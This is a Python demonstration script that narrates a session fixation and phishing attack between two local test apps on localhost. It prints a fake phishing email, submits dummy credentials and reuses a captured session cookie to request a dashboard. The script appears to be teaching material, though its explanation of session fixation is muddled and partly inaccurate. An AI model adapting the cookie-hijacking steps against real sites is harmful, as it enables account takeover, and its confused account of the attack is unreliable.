#!/usr/bin/env python3
"""
Realistic Session Fixation Attack Demo
This script demonstrates how a hacker steals session IDs from a vulnerable app
and uses them to access user accounts on a secure app.
"""

import requests
import time

class RealisticSessionFixationDemo:
    def __init__(self):
        self.hacker_app = "http://localhost:5000"  # Vulnerable app (hacker's)
        self.user_app = "http://localhost:5001"    # Secure app (user's)
        self.hacker_session = requests.Session()
        self.user_session = requests.Session()
    
    def step1_hacker_creates_malicious_site(self):
        """Step 1: Hacker creates a malicious site to steal session IDs."""
        print("🎭 STEP 1: HACKER CREATES MALICIOUS SITE")
        print("=" * 50)
        
        print("Hacker creates a fake login site that looks legitimate...")
        print(f"Hacker's malicious site: {self.hacker_app}")
        print("This site is designed to steal session IDs from users!")
        
        # Hacker visits his own site to get a session ID
        response = self.hacker_session.get(f"{self.hacker_app}/login")
        session_cookie = self.hacker_session.cookies.get('session')
        
        if session_cookie:
            print(f"🎯 Hacker captured session ID: {session_cookie}")
            print("💡 This session ID will be used to track the victim!")
            return session_cookie
        else:
            print("❌ No session cookie found")
            return None
    
    def step2_hacker_tricks_user(self, session_id):
        """Step 2: Hacker tricks user into visiting malicious site."""
        print(f"\n🎭 STEP 2: HACKER TRICKS USER")
        print("=" * 50)
        
        print("Hacker sends phishing email to user:")
        print("Subject: 'Your account has been compromised!'")
        print("Body: 'Click here to verify your account: http://localhost:5000/login'")
        print()
        print("💡 The user thinks this is a legitimate security check!")
        print(f"🎯 User will unknowingly use session ID: {session_id}")
        
        return session_id
    
    def step3_user_visits_malicious_site(self, session_id):
        """Step 3: User visits hacker's malicious site."""
        print(f"\n👤 STEP 3: USER VISITS MALICIOUS SITE")
        print("=" * 50)
        
        print("User receives the phishing email and clicks the link...")
        print("User thinks they're on a legitimate security page...")
        
        # User visits the malicious site
        response = self.user_session.get(f"{self.hacker_app}/login")
        print(f"User visits: {self.hacker_app}/login")
        print(f"Status: {response.status_code}")
        
        # User enters their credentials on the malicious site
        print("User enters their credentials on the malicious site...")
        login_data = {'username': 'user123', 'password': 'password123'}
        response = self.user_session.post(f"{self.hacker_app}/login", data=login_data)
        print(f"User enters: user123/password123")
        print(f"Status: {response.status_code}")
        
        print("💀 Hacker now has the user's credentials!")
        print("🎯 The session ID is now associated with user's login!")
        
        return True
    
    def step4_hacker_uses_stolen_session(self, session_id):
        """Step 4: Hacker uses stolen session to access user's real account."""
        print(f"\n🎭 STEP 4: HACKER USES STOLEN SESSION")
        print("=" * 50)
        
        print("Hacker now uses the stolen session ID to access user's real account...")
        
        # Hacker sets the stolen session cookie
        self.hacker_session.cookies.set('session', session_id, domain='localhost', path='/')
        
        # Hacker tries to access user's dashboard on the real app
        print(f"Hacker accessing user's account on: {self.user_app}/dashboard")
        response = self.hacker_session.get(f"{self.user_app}/dashboard")
        print(f"Status: {response.status_code}")
        
        if response.status_code == 200:
            print("🎯 SUCCESS! Hacker can access user's real account!")
            print("💀 The hacker has successfully hijacked the user's session!")
            return True
        else:
            print("❌ Attack failed - session not accessible on secure app")
            return False
    
    def step5_show_real_vs_malicious(self):
        """Step 5: Show the difference between real and malicious sites."""
        print(f"\n🔍 STEP 5: REAL VS MALICIOUS SITES")
        print("=" * 50)
        
        print("Real User App (Secure):")
        print(f"  URL: {self.user_app}")
        print("  Features: Session regeneration, secure cookies")
        print("  Purpose: Legitimate user account management")
        print()
        
        print("Hacker's Malicious App (Vulnerable):")
        print(f"  URL: {self.hacker_app}")
        print("  Features: No session regeneration, insecure cookies")
        print("  Purpose: Steal session IDs and credentials")
        print()
        
        print("💡 The user can't tell the difference between the two sites!")
    
    def run_demo(self):
        """Run the complete realistic session fixation attack demo."""
        print("🚨 REALISTIC SESSION FIXATION ATTACK DEMONSTRATION")
        print("=" * 60)
        print("This demo shows how a hacker creates a malicious site to steal")
        print("session IDs and use them to access user accounts.")
        print()
        
        # Step 1: Hacker creates malicious site
        session_id = self.step1_hacker_creates_malicious_site()
        if not session_id:
            print("❌ Demo failed - no session ID captured")
            return
        
        # Step 2: Hacker tricks user
        stolen_session = self.step2_hacker_tricks_user(session_id)
        
        # Step 3: User visits malicious site
        user_success = self.step3_user_visits_malicious_site(stolen_session)
        if not user_success:
            print("❌ Demo failed - user interaction failed")
            return
        
        # Step 4: Hacker exploits stolen session
        attack_success = self.step4_hacker_uses_stolen_session(stolen_session)
        
        # Step 5: Show real vs malicious
        self.step5_show_real_vs_malicious()
        
        # Summary
        print(f"\n📊 ATTACK SUMMARY")
        print("=" * 30)
        if attack_success:
            print("🎯 ATTACK SUCCESSFUL!")
            print("💀 The hacker successfully stole the user's session!")
            print("🔒 This demonstrates the real danger of session fixation!")
        else:
            print("❌ Attack failed - secure app protected against session fixation")
        
        print(f"\n🔍 TECHNICAL DETAILS:")
        print(f"Stolen Session ID: {session_id}")
        print(f"Hacker's site: {self.hacker_app}")
        print(f"User's real site: {self.user_app}")
        print(f"Attack method: Session fixation via phishing")

def main():
    print("🚨 Realistic Session Fixation Attack Demo")
    print("Make sure vulnerable_app.py is running on port 5000")
    print("Make sure secure_app.py is running on port 5001")
    print()
    
    demo = RealisticSessionFixationDemo()
    demo.run_demo()

if __name__ == '__main__':
    main() 